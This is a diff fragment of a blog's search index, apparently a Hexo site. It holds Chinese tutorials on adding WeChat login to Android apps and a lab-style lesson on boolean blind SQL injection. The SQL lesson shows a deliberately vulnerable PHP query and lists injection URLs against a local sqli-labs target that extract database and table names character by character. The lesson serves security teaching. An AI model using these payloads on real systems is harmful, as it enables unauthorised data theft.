-&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
-</code></pre><p>[4]在AndroidManifest.xml中添加activity注册.   </p>
-<pre><code>&lt;activity android:name=&quot;.wxapi.WXEntryActivity&quot;
-    android:label=&quot;@string/app_name&quot;
-    android:exported=&quot;true&quot;
-    android:launchMode=&quot;singleTop&quot;
-    &gt;
-&lt;/activity&gt;
-</code></pre><p>[5]在WXEntryActivity中继承Activity并实现IWXAPIEventHandler接口.   </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-4a894506b8235e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实现IWXAPIEventHandler接口"><br>重写onCreate方法<br>在onCreate中需要重新注册一下微信<br>要不微信不执行回掉<br><img src="http://upload-images.jianshu.io/upload_images/2590671-bb5ff100cf328000.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="重写onCreate方法"></p>
-<p>实现onReq和onResp方法<br><a href="http://www.jianshu.com/p/c92e1134448d" target="_blank" rel="noopener">使用okhttp获取微信的openid和用户信息</a></p>
-<p>在onResp中可以获取code<br> 通过code参数加上AppID和AppSecret等，通过API换取access_token；<br> 通过access_token进行接口调用，获取用户基本数据资源或帮助用户实现基本操作。<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419317851&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">详情请参照</a></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-8052581cdb699373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="onReq和onResp方法">  </p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-        <tag>weixin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.3.1-SQL注入-SQL盲注-布尔盲注</title>
-    <url>/post/2904355367.html</url>
-    <content><![CDATA[<h2 id="SQL盲注-布尔盲注"><a href="#SQL盲注-布尔盲注" class="headerlink" title="SQL盲注-布尔盲注"></a>SQL盲注-布尔盲注</h2><h3 id="01布尔盲注原理"><a href="#01布尔盲注原理" class="headerlink" title="01布尔盲注原理"></a>01布尔盲注原理</h3><pre><code>$id=$_GET[&#39;id&#39;];
-$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1 &quot;;
-$result=mysql_query($sql);
-$row=mysql_fetch_array($result);
-if($row)
-{
-    echo &quot;Right&quot;;
-}
-else
-{
-    echo &quot;Wrong&quot;;
-}
-</code></pre><p>代码存在SQL注入漏洞<br>然而页面即不会回显数据，也不会回显错误信息  </p>
-<p>只返回 “Right” 与 “Wrong”   </p>
-<p>这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的“真”和“假”来识别我们的判断是否正确，这既是布尔盲注！  </p>
-<p>正确请求，id=1 -&gt; 返回 id=1的数据  </p>
-<p>错误请求，id=1’ -&gt; 返回 与正确页面不同的页面<br>1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id=1 and left((select version()),1)=5–+<br>2.想办法构造语句，判断数据库中内容的值<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/01.jpeg" alt=""></p>
-<h3 id="02布尔盲注方法"><a href="#02布尔盲注方法" class="headerlink" title="02布尔盲注方法"></a>02布尔盲注方法</h3><p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入  </p>
-<pre><code>left() left(database(),1)&gt;&#39;s&#39;
-        database()显示数据库名称，left(a,b)从左侧截取a的前b位
-regexp select user() regexp &#39;^r&#39;
-        正则表达式的用法user()结果位root,regexp为匹配root的正则表达式
-like    select user() like &#39;ro%&#39;
-        与regexp类似，使用like进行匹配
-substr()  ascii(substr((select database()),1,1))=98
-ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
-ord()    ord(mid((select user()),1,1))=114
-mid()    mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/02.jpeg" alt=""></p>
-<p><a href="http://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">MySql正则表达式</a></p>
-<p>注入点： </p>
-<pre><code>http://localhost:90/Less-8/?id=1&#39;
-http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;a&#39;--+
-http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39;--+ 显示正确第一位为s
-
-http://localhost:90/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+ 第一个表名称字符
-
-http://localhost:90/Less-8/?id=1&#39; and (select database() regexp &#39;^s&#39;)--+
-
-http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^s&#39;)--+
-
-http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;e%&#39;)--+
-
-http://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+
-
-http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from information_schema.tables where table_schema=database()),1,1))=115--+
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/ascii.jpg" alt=""></p>
-<h2 id="burp操作步骤"><a href="#burp操作步骤" class="headerlink" title="burp操作步骤"></a>burp操作步骤</h2><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/03.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/04.jpg" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/05.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/06.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/07.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>sql盲注</tag>
       </tags>
   </entry>
   <entry>
@@ -11169,6 +10956,224 @@ protected void initData() {
       <tags>
         <tag>adnroid</tag>
         <tag>recyclerview</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android微信第三方登录1</title>
+    <url>/post/2304481464.html</url>
+    <content><![CDATA[<p><a href="https://github.com/shaomiao/AndroidWechatTest" target="_blank" rel="noopener">github测试地址</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=11_1" target="_blank" rel="noopener">微信SDK下载地址</a><br><a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台</a><br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=1417751808&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">微信api</a>  </p>
+<h2 id="开始接入微信登录"><a href="#开始接入微信登录" class="headerlink" title="开始接入微信登录"></a>开始接入微信登录</h2><p>1.申请你的AppID<br>注意：  </p>
+<h5 id="包名正确（重要）"><a href="#包名正确（重要）" class="headerlink" title="包名正确（重要）"></a>包名正确（重要）</h5><h5 id="签名正确（重要）"><a href="#签名正确（重要）" class="headerlink" title="签名正确（重要）"></a>签名正确（重要）</h5><p>微信提供的签名生成工具<br>把包名添加上去就可以获取签名<br>注意：把要获取签名的应用安装在手机上<br><a href="https://res.wx.qq.com/open/zh_CN/htmledition/res/dev/download/sdk/Gen_Signature_Android2.apk" target="_blank" rel="noopener">获取签名应用</a>  </p>
+<p>2.下载开发工具包<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN" target="_blank" rel="noopener">https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN</a>  </p>
+<p>3.在项目中引入开发包<br><img src="http://upload-images.jianshu.io/upload_images/2590671-b6783667e961b04b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在项目中引入开发工具包">  </p>
+<p>4.使用开发工具包<br>下面代码都是在MainActivity中<br>[1]注册微信  </p>
+<pre><code>
+private static final String APP_ID="你的appid";
+private IWXAPI api;
+private void regToWx(){
+    api= WXAPIFactory.createWXAPI(this,APP_ID,true);
+    api.registerApp(APP_ID);
+}
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+      super.onCreate(savedInstanceState);
+      setContentView(R.layout.activity_main);
+      //注册微信
+      regToWx();
+}
+</code></pre>
+
+
+
+
+<p>[2]登录微信</p>
+<pre><code>@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    //注册微信
+    regToWx();
+    findViewById(R.id.wechat_login).setOnClickListener(new View.OnClickListener() {
+        @Override
+        public void onClick(View v) {
+            //登录微信
+            final SendAuth.Req req = new SendAuth.Req();
+            req.scope = &quot;snsapi_userinfo&quot;;
+            req.state = &quot;wechat_sdk_demo_test&quot;;
+            api.sendReq(req);
+        }
+    });
+}
+</code></pre><p>5.下面是最重要的一步。。。。<br>[1]建包<br>注意：要在你的包名下新建 wxapi 包<br>你的包名.wxapi  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-972bd98cefcbe360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="你的包名.wxapi"></p>
+<p>[2]建立与微信通讯的activity<br>在wxapi下新建activity<br>WXEntryActivity<br>[3]在AndroidManifest.xml中添加权限.   </p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
+</code></pre><p>[4]在AndroidManifest.xml中添加activity注册.   </p>
+<pre><code>&lt;activity android:name=&quot;.wxapi.WXEntryActivity&quot;
+    android:label=&quot;@string/app_name&quot;
+    android:exported=&quot;true&quot;
+    android:launchMode=&quot;singleTop&quot;
+    &gt;
+&lt;/activity&gt;
+</code></pre><p>[5]在WXEntryActivity中继承Activity并实现IWXAPIEventHandler接口.   </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-4a894506b8235e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实现IWXAPIEventHandler接口"><br>重写onCreate方法<br>在onCreate中需要重新注册一下微信<br>要不微信不执行回掉<br><img src="http://upload-images.jianshu.io/upload_images/2590671-bb5ff100cf328000.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="重写onCreate方法"></p>
+<p>实现onReq和onResp方法<br><a href="http://www.jianshu.com/p/c92e1134448d" target="_blank" rel="noopener">使用okhttp获取微信的openid和用户信息</a></p>
+<p>在onResp中可以获取code<br> 通过code参数加上AppID和AppSecret等，通过API换取access_token；<br> 通过access_token进行接口调用，获取用户基本数据资源或帮助用户实现基本操作。<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419317851&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">详情请参照</a></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-8052581cdb699373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="onReq和onResp方法">  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>weixin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android微信第三方登录2</title>
+    <url>/post/273860866.html</url>
+    <content><![CDATA[<p>利用http与微信通信换取用户信息和openid<br>使用了okhttp作为http通信的框架  </p>
+<hr>
+<ol>
+<li><p>首先实例化okhttp连接  </p>
+<p> <code>private final OkHttpClient client = new OkHttpClient();</code></p>
+</li>
+</ol>
+<h6 id="获得code"><a href="#获得code" class="headerlink" title="获得code"></a>获得code</h6><pre><code>case BaseResp.ErrCode.ERR_OK:
+//      可用以下两种方法获得code
+//      resp.toBundle(bundle);
+//      Resp sp = new Resp(bundle);
+//      String code = sp.code;
+//      或者
+String code = ((SendAuth.Resp) baseResp).code;
+String state = ((SendAuth.Resp) baseResp).state;
+Toast.makeText(getApplicationContext(), &quot;恭喜这是你的code&quot; + code, Toast.LENGTH_LONG).show();
+Log.e(TAG, &quot;onResp: &quot; + code);
+try {
+    getAccess_token(code);
+} catch (Exception e) {
+    e.printStackTrace();
+}
+//上面的code就是接入指南里要拿到的code
+break;
+</code></pre><hr>
+<h6 id="根据code获取用户信息"><a href="#根据code获取用户信息" class="headerlink" title="根据code获取用户信息"></a>根据code获取用户信息</h6><pre><code>private void getAccess_token(String code) throws Exception {
+    String url = &quot;https://api.weixin.qq.com/sns/oauth2/access_token?&quot; +
+            &quot;appid=&quot; + ConfigUtil.Wechat_Appid +
+            &quot;&amp;secret=&quot; + ConfigUtil.Wechat_AppSecret +
+            &quot;&amp;code=&quot; + code +
+            &quot;&amp;grant_type=authorization_code&quot;;
+    run(url);
+}
+</code></pre><hr>
+<h6 id="引入okhttp包"><a href="#引入okhttp包" class="headerlink" title="引入okhttp包"></a>引入okhttp包</h6><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e535b2d91c6473b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="引入okhttp的包"></p>
+<pre><code>//通过http与微信通信
+public void run(String url) throws Exception {
+final Request request = new Request.Builder()
+        //.url(&quot;http://publicobject.com/helloworld.txt&quot;)
+        .url(url)
+        .get()
+        .build();
+
+client.newCall(request).enqueue(new Callback() {
+    @Override
+    public void onFailure(Call call, IOException e) {
+        e.printStackTrace();
+    }
+
+    @Override
+    public void onResponse(Call call, Response response) throws IOException {
+        if (!response.isSuccessful()) throw new IOException(&quot;Unexpected code &quot; + response);
+        try {
+            String responseStr=response.body().string();
+            JSONObject jsonObject = new JSONObject(responseStr);
+            System.out.println(TAG + jsonObject.getString(&quot;access_token&quot;));//在回调中获取access_token
+        } catch (JSONException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+
+    }
+});
+}
+</code></pre><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>如果微信调不起来<br>仔细检查签名是否正确<br>如果修改过签名<br>可以重新安装下微信再试一下  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>weixin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.3.1-SQL注入-SQL盲注-布尔盲注</title>
+    <url>/post/2904355367.html</url>
+    <content><![CDATA[<h2 id="SQL盲注-布尔盲注"><a href="#SQL盲注-布尔盲注" class="headerlink" title="SQL盲注-布尔盲注"></a>SQL盲注-布尔盲注</h2><h3 id="01布尔盲注原理"><a href="#01布尔盲注原理" class="headerlink" title="01布尔盲注原理"></a>01布尔盲注原理</h3><pre><code>$id=$_GET[&#39;id&#39;];
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1 &quot;;
+$result=mysql_query($sql);
+$row=mysql_fetch_array($result);
+if($row)
+{
+    echo &quot;Right&quot;;
+}
+else
+{
+    echo &quot;Wrong&quot;;
+}
+</code></pre><p>代码存在SQL注入漏洞<br>然而页面即不会回显数据，也不会回显错误信息  </p>
+<p>只返回 “Right” 与 “Wrong”   </p>
+<p>这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的“真”和“假”来识别我们的判断是否正确，这既是布尔盲注！  </p>
+<p>正确请求，id=1 -&gt; 返回 id=1的数据  </p>
+<p>错误请求，id=1’ -&gt; 返回 与正确页面不同的页面<br>1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id=1 and left((select version()),1)=5–+<br>2.想办法构造语句，判断数据库中内容的值<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/01.jpeg" alt=""></p>
+<h3 id="02布尔盲注方法"><a href="#02布尔盲注方法" class="headerlink" title="02布尔盲注方法"></a>02布尔盲注方法</h3><p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入  </p>
+<pre><code>left() left(database(),1)&gt;&#39;s&#39;
+        database()显示数据库名称，left(a,b)从左侧截取a的前b位
+regexp select user() regexp &#39;^r&#39;
+        正则表达式的用法user()结果位root,regexp为匹配root的正则表达式
+like    select user() like &#39;ro%&#39;
+        与regexp类似，使用like进行匹配
+substr()  ascii(substr((select database()),1,1))=98
+ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
+ord()    ord(mid((select user()),1,1))=114
+mid()    mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/02.jpeg" alt=""></p>
+<p><a href="http://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">MySql正则表达式</a></p>
+<p>注入点： </p>
+<pre><code>http://localhost:90/Less-8/?id=1&#39;
+http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;a&#39;--+
+http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39;--+ 显示正确第一位为s
+
+http://localhost:90/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+ 第一个表名称字符
+
+http://localhost:90/Less-8/?id=1&#39; and (select database() regexp &#39;^s&#39;)--+
+
+http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^s&#39;)--+
+
+http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;e%&#39;)--+
+
+http://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+
+
+http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from information_schema.tables where table_schema=database()),1,1))=115--+
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/ascii.jpg" alt=""></p>
+<h2 id="burp操作步骤"><a href="#burp操作步骤" class="headerlink" title="burp操作步骤"></a>burp操作步骤</h2><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/03.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/04.jpg" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/05.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/06.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/07.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sql盲注</tag>
       </tags>
   </entry>
   <entry>
